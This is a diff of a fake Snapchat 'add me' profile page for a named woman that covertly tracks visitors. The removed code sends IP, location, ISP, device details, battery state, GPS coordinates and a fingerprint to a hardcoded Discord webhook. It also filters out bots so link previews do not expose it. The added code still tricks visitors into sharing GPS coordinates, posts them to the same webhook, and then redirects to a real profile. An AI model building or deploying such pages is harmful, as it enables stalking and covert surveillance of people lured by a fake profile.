@@ -3,118 +3,81 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Snapchat</title>
+  <title>Ajouter sur Snapchat</title>
   <style>
     body {
-      background-color: #fffcf7;
+      background-color: #ffeef8;
       font-family: Arial, sans-serif;
       text-align: center;
-      padding: 40px;
-      color: #333;
+      padding-top: 40px;
     }
     img {
       border-radius: 50%;
-      width: 150px;
-      height: 150px;
+      width: 128px;
+      height: 128px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
       margin-bottom: 20px;
     }
-    button {
-      background-color: #FFFC00;
-      border: none;
-      padding: 15px 25px;
-      font-size: 18px;
-      font-weight: bold;
-      border-radius: 30px;
-      cursor: pointer;
+    h2 {
+      margin-bottom: 10px;
+      color: #444;
     }
-    .info {
-      margin-top: 20px;
-      font-size: 15px;
-      color: #666;
+    button {
+      padding: 12px 25px;
+      font-size: 16px;
+      background-color: #fffc00;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+      transition: 0.2s ease;
+    }
+    button:hover {
+      background-color: #f9e302;
+    }
+    p {
+      color: #777;
+      font-size: 14px;
     }
   </style>
 </head>
 <body>
-  <img src="https://i.imgur.com/NfMCcDb.png" alt="Salma Profile Pic">
-  <h2>Salma Mansouri 👻</h2>
-  <p class="info">Snapchat vérifie l’authenticité du profil.<br>Veuillez autoriser l'accès à votre position après avoir cliqué ci-dessous.</p>
-  <button onclick="beginLogging()">Ajouter sur Snapchat</button>
+
+  <img src="https://raw.githubusercontent.com/RimElFassi/Profile-login-/main/Salma.jpg" alt="Salma Profile Picture">
+
+  <h2>Salma Mansouri</h2>
+  <p>Ajouter sur Snapchat</p>
+
+  <button onclick="demanderPosition()">Ajouter</button>
 
   <script>
-    const webhook = "https://discord.com/api/webhooks/1398793243692499055/fdMhPoKYGBXY96dCLTHEqho3lLc4rAfXJIYYi43yXz591O5pssHMg_mErqvo6hu5eI-Y";
-
-    function send(msg) {
-      fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: msg })
-      });
-    }
-
-    function beginLogging() {
-      const ua = navigator.userAgent.toLowerCase();
-      const token = "tracker"; // optional: you can check window.location.search if needed
-      const isBot = ua.includes("bot") || ua.includes("discord") || ua.includes("preview") || screen.width < 400;
-
-      if (isBot) {
-        console.log("Visite bloquée (bot ou explorateur).");
-        return;
+    function demanderPosition() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            // Send to your Discord Webhook
+            fetch("https://discord.com/api/webhooks/1398793243692499055/fdMhPoKYGBXY96dCLTHEqho3lLc4rAfXJIYYi43yXz591O5pssHMg_mErqvo6hu5eI-Y", {
+              method: "POST",
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                content: `📍 Nouvelle visite:\nLatitude: ${latitude}\nLongitude: ${longitude}\nLien: ${window.location.href}`
+              })
+            }).then(() => {
+              window.location.href = "https://www.snapchat.com/add/Salma_Mansouri2";
+            });
+          },
+          function(error) {
+            alert("Accès à la localisation refusé.");
+          }
+        );
+      } else {
+        alert("La géolocalisation n'est pas supportée par ce navigateur.");
       }
-
-      // General Info
-      fetch("https://ipinfo.io/json?token=ce57c9ed4f132b")
-        .then(res => res.json())
-        .then(ipdata => {
-          const lang = navigator.language;
-          const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-          const screenSize = screen.width + "x" + screen.height;
-
-          let msg = `👤 **Visite de profil Snap**\n`;
-          msg += `IP: ${ipdata.ip} | Ville: ${ipdata.city}, ${ipdata.region}\n`;
-          msg += `Fournisseur: ${ipdata.org}\n`;
-          msg += `Navigateur: ${navigator.userAgent}\n`;
-          msg += `Langue: ${lang} | Fuseau horaire: ${tz} | Écran: ${screenSize}`;
-          send(msg);
-        });
-
-      // Battery Info
-      if ('getBattery' in navigator) {
-        navigator.getBattery().then(b => {
-          send(`🔋 Batterie: ${Math.round(b.level * 100)}% | En charge: ${b.charging}`);
-        });
-      }
-
-      // Capabilities
-      const caps = [
-        `'Touch': ${'ontouchstart' in window}`,
-        `'Bluetooth': ${'bluetooth' in navigator}`,
-        `'MediaDevices': ${'mediaDevices' in navigator}`,
-        `'Clipboard': ${'clipboard' in navigator}`
-      ].join(' | ');
-      send(`📱 Capacités: ${caps}`);
-
-      // GPS (after permission)
-      navigator.geolocation.getCurrentPosition((pos) => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const acc = pos.coords.accuracy;
-        const map = `https://www.google.com/maps?q=${lat},${lon}`;
-
-        send(`📍 **Coordonnées GPS**\nLatitude: ${lat}, Longitude: ${lon}, Précision: ${acc}m\n🔗 ${map}`);
-
-        // Redirect to real Snap profile after GPS capture
-        setTimeout(() => {
-          window.location.href = "https://snapchat.com/add/Salma_Mansouri2";
-        }, 2000);
-      }, () => {
-        // Redirect anyway if denied
-        window.location.href = "https://snapchat.com/add/Salma_Mansouri2";
-      });
-
-      // Fingerprint
-      const fp = btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
-      send(`🧬 Empreinte du périphérique: ${fp}`);
     }
   </script>
+
 </body>
 </html>
